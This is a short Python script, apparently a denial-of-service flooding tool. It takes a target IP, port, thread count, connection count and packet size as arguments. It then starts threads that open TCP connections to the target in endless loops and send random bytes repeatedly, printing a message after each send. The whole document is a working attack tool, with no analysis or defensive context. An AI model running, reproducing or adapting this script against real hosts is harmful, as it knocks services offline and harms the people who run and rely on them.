import os,sys
import random, socket, threading
ip = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])
conn = int(sys.argv[4])
psize = int(sys.argv[5])
def run():
    data = random._urandom(psize) # Packet Size
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, port))
            s.send(data)
            for x in range(conn):
                s.send(data)
            print("[+] Sended ("+str(len(data))+").")
        except:
            s.close()

for y in range(threads):
    th = threading.Thread(target=run)
    th.start()
